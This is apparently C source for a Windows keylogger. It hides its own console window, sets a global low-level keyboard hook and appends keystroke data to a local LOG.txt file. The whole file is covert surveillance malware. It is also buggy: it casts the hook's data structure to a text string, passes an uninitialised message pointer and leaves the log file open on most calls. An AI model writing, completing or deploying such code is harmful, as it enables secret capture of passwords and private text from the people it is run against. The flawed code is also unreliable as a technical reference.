#include <stdio.h>
#include <windows.h>
#include <winuser.h>

HHOOK hook;
LPMSG msg;
FILE *LOG;

void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam){
    LOG = fopen("LOG.txt", "a+");
    if (wParam == WM_KEYDOWN)
    {
    	fputs((char *)lParam, LOG);
    	fclose(LOG);

    }
    return CallNextHookEx(hook,code,wParam,lParam);
}

int main() {
	Stealth();
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	if (hook != NULL) 
		puts("All is good");
	else
		puts("Something went wrong :(");
	while(GetMessage(msg, NULL, 0, 0) > 0) {
    	TranslateMessage(msg);
    	DispatchMessage(msg);
	}
	return 0;
}